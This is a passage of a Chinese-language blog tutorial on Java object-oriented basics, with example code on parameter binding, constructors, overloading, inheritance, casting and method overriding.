+&#125;
+</code></pre>
+<p>运行代码，看结果可知，在<code>age赋值为15</code>后传入<code>Person</code>的<code>setAge()</code>方法,第一次通过<code>getAge()</code>方法获取<code>person实例</code>的age的值是15，在Main类的age重新赋值为20后再次调用<code>person实例</code>的<code>getAge()</code>方法，得到的值依旧是15</p>
+<p>原因是<code>setAge()</code>方法获得的参数，复制了<code>age</code>的值，<code>person实例</code>的age和<code>Main类</code>的age的值得修改互不影响</p>
+<h6 id="引用类型参数绑定"><a href="#引用类型参数绑定" class="headerlink" title="引用类型参数绑定"></a>引用类型参数绑定</h6><pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        String[] fullName = new String[]&#123;&quot;xcc&quot;,&quot;xccit&quot;,&quot;ywx&quot;&#125;;
+        Person p = new Person();
+        p.setNames(fullName);
+        System.out.println(p.getName());//xcc xccit
+        fullName[0] = &quot;JamesY&quot;;
+        System.out.println(p.getName());//JamesY xccit
+    &#125;
+&#125;
+class Person&#123;
+    private String[] names;
+
+    public void setNames(String[] names)&#123;
+        this.names = names;
+    &#125;
+    public String getName()&#123;
+        return this.names[0] + &quot; &quot; + this.names[1];
+    &#125;
+&#125;
+</code></pre>
+<p>注意<code>setNames()</code>传入的参数是一个数组，将数组传入<code>setNames()</code>后，修改<code>fullName</code>的内容，对象的<code>names</code>也被修改</p>
+<p>结论：引用类型参数的传递，调用方的变量，和接收方的参数变量，指向的是同一个对象。双方任意一方对这个对象的修改，都会影响对方（因为指向同一个对象嘛）。</p>
+<h6 id="特殊的引用类型参数绑定"><a href="#特殊的引用类型参数绑定" class="headerlink" title="特殊的引用类型参数绑定"></a>特殊的引用类型参数绑定</h6><p>有了上个引用类型参数绑定的案例，再看看另外一个:</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        String name = &quot;Bob&quot;;
+        Person person = new Person();
+        person.setName(name);
+        System.out.println(person.getName());//Bob
+        name = &quot;James&quot;;
+        System.out.println(person.getName());//Bob
+    &#125;
+&#125;
+class Person&#123;
+    private String name;
+
+    public String getName() &#123;
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        this.name = name;
+    &#125;
+&#125;
+</code></pre>
+<p>这里参数使用<code>String</code>类型，在参数被修改后对象的<code>name</code>并没有被改变，原因在哪呢？</p>
+<p>看一下这份代码的运行结果：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        String name = &quot;Bob&quot;;
+        Person person = new Person();
+        person.setName(name);
+        System.out.println(person.getName());//Bob
+        System.out.println(name == person.getName());//true
+        name = &quot;James&quot;;
+        System.out.println(person.getName());//Bob
+        System.out.println(name == person.getName());//false
+    &#125;
+&#125;
+class Person&#123;
+    private String name;
+
+    public String getName() &#123;
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        this.name = name;
+    &#125;
+&#125;
+</code></pre>
+<p><code>==</code>在对诸如<code>String、Date</code>这种引用类型对象比较时，比较的是<code>内存地址</code>，在改变<code>name</code>的值后内存地址也发生了改变，<code>name</code>和<code>person对象的name</code>指向不同的地址，<code>person</code>依旧指向内存中的<code>Bob</code>,而<code>name</code>已经指向了一个新的值<code>James</code>，他们指向的地址不同，所以对应的值也不同，所以就会出现第一次给<code>person.setName()</code>指向name的值<code>Bob</code>不会被改变的状态。</p>
+<p>简而言之，第一次给<code>person的name赋值为&quot;Bob&quot;</code>，在Main中的name值被改变后，Main中的name的值指向一个新的地址”James”,而<code>person的name</code>依旧指向”Bob”</p>
+<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><h4 id="封装概念"><a href="#封装概念" class="headerlink" title="封装概念"></a>封装概念</h4><p>封装就是将类的属性及实现方式隐藏起来，对外提供一个方法进行访问而不是直接访问，通常对参数使用<code>private</code>,并且提供<code>getter/setter</code>方法进行访问</p>
+<h4 id="参数私密性"><a href="#参数私密性" class="headerlink" title="参数私密性"></a>参数私密性</h4><p>Computer.java</p>
+<pre><code class="java">public class Computer &#123;
+    private int code;
+    private String cpu;
+    private boolean isNevdia;
+
+    public int getCode() &#123;
+        return code;
+    &#125;
+
+    public void setCode(int code) &#123;
+        this.code = code;
+    &#125;
+
+    public String getCpu() &#123;
+        return cpu;
+    &#125;
+
+    public void setCpu(String cpu) &#123;
+        this.cpu = cpu;
+    &#125;
+
+    public boolean isNevdia() &#123;
+        return isNevdia;
+    &#125;
+
+    public void setNevdia(boolean nevdia) &#123;
+        isNevdia = nevdia;
+    &#125;
+&#125;
+</code></pre>
+<p>上面的类就对属性使用了private修饰符，使属性不能被直接调用，要使用参数必须调用参数对应的<code>getter/setter</code>方法</p>
+<p>Main.java</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Computer computer = new Computer();
+        computer.setCode(10);
+        System.out.println(computer.getCode());//10
+    &#125;
+&#125;
+</code></pre>
+<h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><h5 id="无参构造"><a href="#无参构造" class="headerlink" title="无参构造"></a>无参构造</h5><p>无参构造实际上我们前面一直在用：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Computer computer = new Computer();//初始化对象时这种操作默认就是无参构造
+        computer.setCode(10);
+        System.out.println(computer.getCode());//10
+    &#125;
+&#125;
+</code></pre>
+<p>而对于Computer类来讲，无参构造也是默认存在的:</p>
+<pre><code class="java">public class Computer &#123;
+    private int code;
+    private String cpu;
+    private boolean isNevdia;
+
+    public int getCode() &#123;
+        return code;
+    &#125;
+
+    public void setCode(int code) &#123;
+        this.code = code;
+    &#125;
+
+    public String getCpu() &#123;
+        return cpu;
+    &#125;
+
+    public void setCpu(String cpu) &#123;
+        this.cpu = cpu;
+    &#125;
+
+    public boolean isNevdia() &#123;
+        return isNevdia;
+    &#125;
+
+    public void setNevdia(boolean nevdia) &#123;
+        isNevdia = nevdia;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Computer &#123;
+    private int code;
+    private String cpu;
+    private boolean isNevdia;
+
+    public Computer() &#123;//无参构造方法
+    &#125;
+
+    public int getCode() &#123;
+        return code;
+    &#125;
+
+    public void setCode(int code) &#123;
+        this.code = code;
+    &#125;
+
+    public String getCpu() &#123;
+        return cpu;
+    &#125;
+
+    public void setCpu(String cpu) &#123;
+        this.cpu = cpu;
+    &#125;
+
+    public boolean isNevdia() &#123;
+        return isNevdia;
+    &#125;
+
+    public void setNevdia(boolean nevdia) &#123;
+        isNevdia = nevdia;
+    &#125;
+&#125;
+</code></pre>
+<p>Computer这两份代码实际上就是一模一样的，只是一个没写无参构造方法，一个写了无参构造方法</p>
+<h5 id="带参构造"><a href="#带参构造" class="headerlink" title="带参构造"></a>带参构造</h5><p>无参构造貌似并没有感受到什么变化，带参构造就有变化了，我们初始化对象后要对其属性赋值，必须一个个使用<code>setter</code>方法赋值，而带参构造就是为了解决这个问题，在初始化对象时直接对属性赋值：</p>
+<pre><code class="java">public class Computer &#123;
+    private int code;
+    private String cpu;
+    private boolean isNevdia;
+
+    public Computer() &#123;//无参构造
+    &#125;
+
+    public Computer(int code, String cpu, boolean isNevdia) &#123;//带参构造
+        this.code = code;
+        this.cpu = cpu;
+        this.isNevdia = isNevdia;
+    &#125;
+
+    public int getCode() &#123;
+        return code;
+    &#125;
+
+    public void setCode(int code) &#123;
+        this.code = code;
+    &#125;
+
+    public String getCpu() &#123;
+        return cpu;
+    &#125;
+
+    public void setCpu(String cpu) &#123;
+        this.cpu = cpu;
+    &#125;
+
+    public boolean isNevdia() &#123;
+        return isNevdia;
+    &#125;
+
+    public void setNevdia(boolean nevdia) &#123;
+        isNevdia = nevdia;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Computer computer = new Computer(10,&quot;i7-7300HQ&quot;,true);
+        System.out.println(computer.getCode()+&quot; &quot;+computer.getCpu()+&quot; &quot;+computer.isNevdia());
+    &#125;
+&#125;
+</code></pre>
+<p>这样在对象初始化时，直接对属性赋值，但请注意:传值的顺序必须与括号内属性的顺序一致</p>
+<p>要特别注意的是，如果我们自定义了一个构造方法，那么，编译器就<em>不再</em>自动创建默认构造方法：</p>
+<pre><code class="java">public class Computer &#123;
+    private int code;
+    private String cpu;
+    private boolean isNevdia;
+
+    public Computer(int code, String cpu, boolean isNevdia) &#123;//带参构造
+        this.code = code;
+        this.cpu = cpu;
+        this.isNevdia = isNevdia;
+    &#125;
+
+    public int getCode() &#123;
+        return code;
+    &#125;
+
+    public void setCode(int code) &#123;
+        this.code = code;
+    &#125;
+
+    public String getCpu() &#123;
+        return cpu;
+    &#125;
+
+    public void setCpu(String cpu) &#123;
+        this.cpu = cpu;
+    &#125;
+
+    public boolean isNevdia() &#123;
+        return isNevdia;
+    &#125;
+
+    public void setNevdia(boolean nevdia) &#123;
+        isNevdia = nevdia;
+    &#125;
+&#125;
+</code></pre>
+<p>这段代码去掉了无参构造方法，只有带参构造,像以前一样直接<code>new Computer();</code>就会报错</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Computer computer = new Computer();//编译报错
+        System.out.println(computer.getCode()+&quot; &quot;+computer.getCpu()+&quot; &quot;+computer.isNevdia());
+    &#125;
+&#125;
+</code></pre>
+<p>看一下控制台:</p>
+<pre><code class="java">E:\IdeaProjects\JavaSE\src\com\oop\base\Main.java:7:29
+java: 无法将类 com.oop.base.Computer中的构造器 Computer应用到给定类型;
+  需要: int,java.lang.String,boolean
+  找到:    没有参数
+  原因: 实际参数列表和形式参数列表长度不同
+</code></pre>
+<p>如果既想使用没有参数的构造方法，又想使用带参数的构造方法，那么只能把两种方法都定义出来</p>
+<h5 id="带参函数参数初始化注意事项"><a href="#带参函数参数初始化注意事项" class="headerlink" title="带参函数参数初始化注意事项"></a>带参函数参数初始化注意事项</h5><h6 id="对象属性的最终值由构造函数决定"><a href="#对象属性的最终值由构造函数决定" class="headerlink" title="对象属性的最终值由构造函数决定"></a>对象属性的最终值由构造函数决定</h6><pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Computer computer = new Computer(10,&quot;i7-7300HQ&quot;,true);
+        System.out.println(computer.getCode()+&quot; &quot;+computer.getCpu()+&quot; &quot;+computer.isNevdia());
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Computer &#123;
+    /*参数已经被初始化*/
+    private int code = 20;
+    private String cpu = &quot;R900&quot;;
+    private boolean isNevdia = false;
+
+/*    public Computer() &#123;//无参构造
+    &#125;*/
+
+    public Computer(int code, String cpu, boolean isNevdia) &#123;//带参构造
+        this.code = code;
+        this.cpu = cpu;
+        this.isNevdia = isNevdia;
+    &#125;
+
+    public int getCode() &#123;
+        return code;
+    &#125;
+
+    public void setCode(int code) &#123;
+        this.code = code;
+    &#125;
+
+    public String getCpu() &#123;
+        return cpu;
+    &#125;
+
+    public void setCpu(String cpu) &#123;
+        this.cpu = cpu;
+    &#125;
+
+    public boolean isNevdia() &#123;
+        return isNevdia;
+    &#125;
+
+    public void setNevdia(boolean nevdia) &#123;
+        isNevdia = nevdia;
+    &#125;
+&#125;
+</code></pre>
+<h5 id="多构造方法"><a href="#多构造方法" class="headerlink" title="多构造方法"></a>多构造方法</h5><p>Java可以定义多个构造方法，在通过<code>new</code>操作符调用的时候，编译器通过构造方法的参数数量、位置和类型自动区分：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Person person = new Person();//调用Person()
+        Person person1 = new Person(&quot;xccit&quot;);//调用Person(String name)
+        Person person2 = new Person(&quot;xccit&quot;,20);//调用Person(String name,int age)
+    &#125;
+&#125;
+class Person&#123;
+    private int age;
+    private String name;
+
+    public int getAge() &#123;
+        return age;
+    &#125;
+
+    public void setAge(int age) &#123;
+        this.age = age;
+    &#125;
+
+    public String getName() &#123;
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        this.name = name;
+    &#125;
+
+    Person()&#123;
+        this(&quot;ywx&quot;);//调用Person(String name)
+    &#125;
+    Person(String name)&#123;
+        this(&quot;ywx&quot;,20);//调用Person(String name,int age)
+    &#125;
+    Person(String name,int age)&#123;
+        this.age = age;
+        this.name = name;
+    &#125;
+&#125;
+</code></pre>
+<p>另外各构造方法之间可以使用<code>this</code>进行调用，这样做的好处就是可以<code>代码复用</code>，具体的自己测试即可</p>
+<h4 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h4><p>在一个类中，如果有功能相同但参数不同的方法，可以把这些方法以同名定义，称为<code>同名方法</code>，方法后面的参数替换掉即可，这就是方法重载</p>
+<pre><code class="java">public class Hello &#123;
+
+    public void hello()&#123;//第一个hello方法
+        System.out.println(&quot;Hello&quot;);
+    &#125;
+    public void hello(String name)&#123;//第二个hello方法
+        System.out.println(&quot;Hello&quot;+name);
+    &#125;
+    public void hello(String[] names)&#123;//第三个hello方法
+        System.out.println(&quot;Hello&quot;+ Arrays.toString(names));
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+       Hello h = new Hello();
+       h.hello();//调用第一个hello()
+       h.hello(&quot;小昕&quot;);//调用第二个hello()
+       h.hello(new String[]&#123;&quot;小昕&quot;,&quot;小明&quot;,&quot;小军&quot;&#125;);//调用第三个hello()
+    &#125;
+&#125;
+</code></pre>
+<p>注意：方法重载的返回值类型通常都是相同的。</p>
+<p>方法重载的目的是：功能类似的方法使用同一名字，更容易记住，因此，调用起来更简单。</p>
+<p>举个栗子，<code>String</code>类提供了多个重载方法<code>indexOf()</code>，可以查找子串：</p>
+<ul>
+<li><code>int indexOf(int ch)</code>：根据字符的Unicode码查找；</li>
+<li><code>int indexOf(String str)</code>：根据字符串查找；</li>
+<li><code>int indexOf(int ch, int fromIndex)</code>：根据字符查找，但指定起始位置；</li>
+<li><code>int indexOf(String str, int fromIndex)</code>根据字符串查找，但指定起始位置。</li>
+</ul>
+<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h4><p>如果有一些功能相同的类，并且在使用时不想二次写代码或者CTRL CV，那么这个时候<code>继承</code>就派上用场了,继承关键字是<code>extends</code></p>
+<p>以Person类举个栗子：</p>
+<pre><code class="java">public class Person &#123;
+    private int age;
+    private String name;
+
+    public int getAge() &#123;
+        return age;
+    &#125;
+
+    public void setAge(int age) &#123;
+        this.age = age;
+    &#125;
+
+    public String getName() &#123;
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        this.name = name;
+    &#125;
+
+    Person()&#123;
+        this(&quot;ywx&quot;);
+    &#125;
+    Person(String name)&#123;
+        this(&quot;ywx&quot;,20);
+    &#125;
+    Person(String name,int age)&#123;
+        this.age = age;
+        this.name = name;
+    &#125;
+
+    @Override
+    public String toString() &#123;
+        return &quot;Person&#123;&quot; +
+                &quot;age=&quot; + age +
+                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +
+                &#39;&#125;&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p>这个时候新建一个类为:Student.java 继承Person</p>
+<pre><code class="java">public class Student extends Person&#123;
+    
+&#125;
+</code></pre>
+<p>这个时候在Main.java中new一个Student实例：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211024135640149.png" alt="image-20211024135640149"></p>
+<p>这个时候new的Student已经可以使用Person的所有方法</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Student student = new Student();
+        student.setAge(20);
+        student.setName(&quot;xccit&quot;);
+        System.out.println(student);
+    &#125;
+&#125;
+</code></pre>
+<p>继承是面向对象编程中非常强大的一种机制，它首先可以复用代码。当我们让<code>Student</code>从<code>Person</code>继承时，<code>Student</code>就获得了<code>Person</code>的所有功能，我们只需要为<code>Student</code>编写新增的功能。</p>
+<p>想让Student实现新功能，只需要给它编写新功能即可：</p>
+<pre><code class="java">public class Student extends Person&#123;
+    public void sayHello(String name)&#123;//新功能，说一句Hello xxx
+        System.out.println(&quot;Hello&quot;+name);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211024140543769.png" alt="image-20211024140543769"></p>
+<h4 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h4><p>在OOP的术语中，我们把<code>Person</code>称为超类（super class），父类（parent class），基类（base class），把<code>Student</code>称为子类（subclass），扩展类（extended class）</p>
+<p>注意到我们在定义<code>Person</code>的时候，没有写<code>extends</code>。在Java中，没有明确写<code>extends</code>的类，编译器会自动加上<code>extends Object</code>。所以，任何类，除了<code>Object</code>，都会继承自某个类。下图是<code>Person</code>、<code>Student</code>的继承树：</p>
+<pre><code class="ascii">┌───────────┐
+│  Object   │
+└───────────┘
+      ▲
+      │
+┌───────────┐
+│  Person   │
+└───────────┘
+      ▲
+      │
+┌───────────┐
+│  Student  │
+└───────────┘
+</code></pre>
+<p>Java只允许一个class继承自一个类，因此，一个类有且仅有一个父类。只有<code>Object</code>特殊，它没有父类。</p>
+<p>类似的，如果我们定义一个继承自<code>Person</code>的<code>Teacher</code>，它们的继承树关系如下：</p>
+<pre><code class="ascii">┌───────────┐
+       │  Object   │
+       └───────────┘
+             ▲
+             │
+       ┌───────────┐
+       │  Person   │
+       └───────────┘
+          ▲     ▲
+          │     │
+          │     │
+┌───────────┐ ┌───────────┐
+│  Student  │ │  Teacher  │
+└───────────┘ └───────────┘
+</code></pre>
+<h4 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h4><p>继承有个特点，就是子类无法访问父类的<code>private</code>字段或者<code>private</code>方法。例如，<code>Student</code>类就无法访问<code>Person</code>类的<code>name</code>和<code>age</code>字段,这使得继承的作用被削弱了。为了让子类可以访问父类的字段，我们需要把<code>private</code>改为<code>protected</code>。用<code>protected</code>修饰的字段可以被子类访问:</p>
+<pre><code class="java">public class Person &#123;
+    protected int age;
+    protected String name;
+
+    public int getAge() &#123;
+        return age;
+    &#125;
+
+    public void setAge(int age) &#123;
+        this.age = age;
+    &#125;
+
+    public String getName() &#123;
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        this.name = name;
+    &#125;
+
+    Person()&#123;
+        this(&quot;ywx&quot;);
+    &#125;
+    Person(String name)&#123;
+        this(&quot;ywx&quot;,20);
+    &#125;
+    Person(String name,int age)&#123;
+        this.age = age;
+        this.name = name;
+    &#125;
+
+    @Override
+    public String toString() &#123;
+        return &quot;Person&#123;&quot; +
+                &quot;age=&quot; + age +
+                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +
+                &#39;&#125;&#39;;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Student extends Person&#123;
+    public void sayHello()&#123;
+        System.out.println(&quot;Hello&quot;+name);//这里的name就是父类的name字段
+    &#125;
+&#125;
+</code></pre>
+<p>因此，<code>protected</code>关键字可以把字段和方法的访问权限控制在继承树内部，一个<code>protected</code>字段和方法可以被其子类，以及子类的子类所访问</p>
+<h4 id="super"><a href="#super" class="headerlink" title="super"></a>super</h4><p><code>super</code>关键字表示父类（超类）。子类引用父类的字段时，可以用<code>super.fieldName</code>，例如：</p>
+<pre><code class="java">public class Student extends Person&#123;
+    public void sayHello()&#123;
+        System.out.println(&quot;Hello&quot;+super.name);//这里的super.name就是父类的name字段
+    &#125;
+&#125;
+</code></pre>
+<p>实际上，这里使用<code>super.name</code>，或者<code>this.name</code>，或者<code>name</code>，效果都是一样的。编译器会自动定位到父类的<code>name</code>字段。</p>
+<p>但是，在某些时候，就必须使用<code>super</code>,举个栗子：</p>
+<pre><code class="java">public class Person &#123;
+    protected int age;
+    protected String name;
+
+    public Person(int age, String name) &#123;
+        this.age = age;
+        this.name = name;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Student extends Person&#123;
+    protected int score;
+
+    public Student(int age, String name, int score) &#123;
+        this.score = score;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Student student = new Student(20,&quot;xccit&quot;,100);
+        System.out.println(student);
+    &#125;
+&#125;
+</code></pre>
+<p>运行上面的代码，会得到一个编译错误，大意是在<code>Student</code>的构造方法中，无法调用<code>Person</code>的构造方法:</p>
+<pre><code class="java">java: 无法将类 com.oop.extend.Person中的构造器 Person应用到给定类型;
+  需要: int,java.lang.String
+  找到:    没有参数
+  原因: 实际参数列表和形式参数列表长度不同
+</code></pre>
+<p>这是因为在Java中，任何<code>class</code>的构造方法，第一行语句必须是调用父类的构造方法。如果没有明确地调用父类的构造方法，编译器会帮我们自动加一句<code>super();</code>，所以，<code>Student</code>类的构造方法实际上是这样：</p>
+<pre><code class="java">public class Student extends Person&#123;
+    protected int score;
+
+    public Student(int age, String name, int score) &#123;
+        super();//自动调用父类的构造方法
+        this.score = score;
+    &#125;
+&#125;
+</code></pre>
+<p>但是，<code>Person</code>类并没有无参数的构造方法，因此，编译失败。</p>
+<p>解决方法是调用<code>Person</code>类存在的某个构造方法。例如：</p>
+<pre><code class="java">public class Student extends Person&#123;
+    protected int score;
+
+    public Student(int age, String name, int score) &#123;
+        super(age,name);//自动调用父类的构造方法
+        this.score = score;
+    &#125;
+&#125;
+</code></pre>
+<p>这样就可以正常编译了,因此我们得出结论：如果父类没有默认的构造方法，子类就必须显式调用<code>super()</code>并给出参数以便让编译器定位到父类的一个合适的构造方法。</p>
+<p>这里还顺带引出了另一个问题：<code>即子类不会继承任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。</code></p>
+<h4 id="阻止继承"><a href="#阻止继承" class="headerlink" title="阻止继承"></a>阻止继承</h4><p>当一个类使用<code>final</code>关键字修饰时，它就不可被继承，如果只想指定类继承它，在Java15中新出两个关键字可以完美解决此需求:</p>
+<p>从Java 15开始，允许使用<code>sealed</code>修饰class，并通过<code>permits</code>明确写出能够从该class继承的子类名称：</p>
+<pre><code class="java">public sealed class Person permits Student,Teacher,Engineer&#123;
+    //现在的Person类就是一个sealed类，通过permits关键字只允许被Student,Teacher,Engineer类继承
+&#125;
+</code></pre>
+<p>如果使用Student继承Person可以这么写:</p>
+<pre><code class="java">public final class Student extends Person&#123;
+    
+&#125;
+</code></pre>
+<p>而如果使用一个未被permits关键字修饰的类继承Person就会报错，例如:</p>
+<pre><code class="java">public final class People&#123;
+    
+&#125;
+</code></pre>
+<p>这种机制主要用于一些框架，防止继承被滥用，最典型的框架便是<code>Spring</code></p>
+<h4 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h4><p>在使用Java的继承时，可以使用<code>父类</code>类型的变量接收<code>子类</code>类型的实例，但不允许使用<code>子类类型变量接收父类实例</code>：</p>
+<p>举个栗子：Student类继承自Person类</p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        Person p = new Student();//允许
+        Student stu = new Person();//禁止，也是错误的
+    &#125;
+&#125;
+</code></pre>
+<h4 id="向下转型"><a href="#向下转型" class="headerlink" title="向下转型"></a>向下转型</h4><p>向下转型跟向上转型完全相反，向下转型是将<code>父类类型实例使用子类类型变量接收</code></p>
+<p>举个栗子:Student类继承自Person类</p>
+<pre><code class="java">public class Main()&#123;
+    public static void main(String[] args)&#123;
+        Person p1 = new Person();
+        Person p2 = new Student();
+        Student stu1 = (Student) p1;//运行时异常，ClassCastException
+        Student stu2 = (Student) p2;//运行成功
+    &#125;
+&#125;
+</code></pre>
+<p>因此，向下转型很可能会失败。失败的时候，Java虚拟机会报<code>ClassCastException</code></p>
+<p>为了避免向下转型出错，Java提供了<code>instanceof</code>操作符，可以先判断一个实例究竟是不是某种类型：</p>
+<pre><code class="java">Person p = new Person();
+System.out.println(p instanceof Person); // true
+System.out.println(p instanceof Student); // false
+
+Student s = new Student();
+System.out.println(s instanceof Person); // true
+System.out.println(s instanceof Student); // true
+
+Student n = null;
+System.out.println(n instanceof Student); // false
+</code></pre>
+<p>如果测试结果为false,在写代码时一定不要用<code>instanceof</code>操作符左边的类型转换成操作符右边的类型</p>
+<p>instanceof<code>实际上判断一个变量所指向的实例是否是指定类型，或者这个类型的子类。如果一个引用变量为</code>null<code>，那么对任何</code>instanceof<code>的判断都为</code>false</p>
+<p>所以建议在进行类型转换操作时，可以使用<code>instanceof</code>进行判断，结果为<code>true</code>后再进行转换</p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        Person person = new Student();
+        if(person instanceof Student)&#123;//只有判断成功才会向下转型
+            Student stu = (Student) person;//转型一定成功！
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>从Java 14开始，判断<code>instanceof</code>后，可以直接转型为指定变量，避免再次强制转型。举个栗子：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Object obj = &quot;I am a String!&quot;;//Object是一切类的超类
+        if(obj instanceof String)&#123;
+            String str = (String) obj;
+            System.out.println(str.toUpperCase());//可以调用String的方法
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>上一份代码还可以这么改：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Object obj = &quot;I am a String!&quot;;//Object是一切类的超类
+        if(obj instanceof String str)&#123;
+            System.out.println(str.toUpperCase());//可以调用String的方法
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="区分继承和组合"><a href="#区分继承和组合" class="headerlink" title="区分继承和组合"></a>区分继承和组合</h4><p><code>继承</code>和<code>组合</code>说起来容易，理解起来可能稍微有点难，特别是对基础并不扎实的童鞋来讲，可能只会写代码，并不知道这么写的意义在哪：</p>
+<p>举个栗子:</p>
+<p>给出三个类：Person,Student,Book</p>
+<p>Person和Student是<code>is</code>关系，Student属于Person的一种，或者可以这么理解:人有很多种职业，按职业区分说这个人是程序员，那个人是学生，老师，白领… 所以在这个基础上，Student继承自Person，写法为:</p>
+<pre><code class="java">public class Student extends Person&#123;
+    
+&#125;
+</code></pre>
+<p>而Book和Student呢？学生需要读书，都有什么书呢？比如语文，数学，英语，那么相应的每一本书属于某个同学，所以Book和Student属于<code>has</code>关系，用代码可以这么写：</p>
+<pre><code class="java">public class Student &#123;
+    private Book book;//Book属于Student
+&#125;
+</code></pre>
+<p>因此继承是is关系，组合是has关系</p>
+<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><h4 id="方法重写（覆写）"><a href="#方法重写（覆写）" class="headerlink" title="方法重写（覆写）"></a>方法重写（覆写）</h4><p>在封装中说过方法重载，多态中又要说方法重写:</p>
+<p>举个栗子:Person和Student</p>
+<pre><code class="java">public class Person&#123;
+    public void run()&#123;
+        System.out.print(&quot;Person.run&quot;);
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Student extends Person&#123;
+    public void run()&#123;//重写父类run方法
+        System.out.print(&quot;Student.run&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>重写和重载的概念要分清：子类如果定义了一个与父类方法签名完全相同的方法，被称为覆写（Override）</p>
+<p>注意：方法名相同，方法参数相同，但方法返回值不同，也是不同的方法。在Java程序中，出现这种情况，编译器会报错。</p>
+<pre><code class="java">class Person &#123;
+    public void run() &#123; … &#125;
+&#125;
+
+class Student extends Person &#123;
+    // 不是Override，因为参数不同:
+    public void run(String s) &#123; … &#125;
+    // 不是Override，因为返回值不同:
+    public int run() &#123; … &#125;
+&#125;
+</code></pre>
+<h5 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h5><p>加上<code>@Override</code>可以让编译器帮助检查是否进行了正确的覆写。希望进行覆写，但是不小心写错了方法签名，编译器会报错。</p>
+<pre><code class="java">public class Person &#123;
+    public void run()&#123;
+        System.out.println(&quot;Run!&quot;);
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Student extends Person&#123;
+    @Override
+    public void run(String s)&#123;//运行失败！因为重写的方法参数不同
+        System.out.println(&quot;Run!&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>正确写法：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211025111155821.png" alt="image-20211025111155821"></p>
+<p>另外，如果手动重写方法并且代码正确，**@Override<strong>并不是必需的，</strong>@Override**只是会在代码编写阶段帮助我们验证是否正确重写方法</p>
+<h5 id="调用谁的方法"><a href="#调用谁的方法" class="headerlink" title="调用谁的方法"></a>调用谁的方法</h5><p>在前面我们使用了<code>父类类型 变量 = new 子类类型();</code>，在使用这种方法创建子类实例后覆写其父类方法，运行时调用其父类方法还是子类自身的方法：</p>
+<pre><code class="java">public class Person &#123;
+    public void run()&#123;
+        System.out.println(&quot;Person.Run!&quot;);
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Student extends Person&#123;
+    @Override
+    public void run()&#123;
+        System.out.println(&quot;Student.Run!&quot;);
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Person person = new Student();//父类new子类
+        person.run();//调用该方法
+    &#125;
+&#125;
+</code></pre>
+<p>运行结果：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211025111900808.png" alt="image-20211025111900808"></p>
+<p>事实证明依旧会调用子类自身的方法，得出结论：Java的实例方法调用是基于运行时的实际类型的动态调用，而非变量的声明类型。</p>
+<p>这个非常重要的特性在面向对象编程中称之为<code>多态</code>。它的英文拼写非常复杂：<code>Polymorphic</code>。</p>
+<h4 id="多态的概念"><a href="#多态的概念" class="headerlink" title="多态的概念"></a>多态的概念</h4><p>多态是指，针对某个类型的方法调用，其真正执行的方法取决于运行时期实际类型的方法。</p>
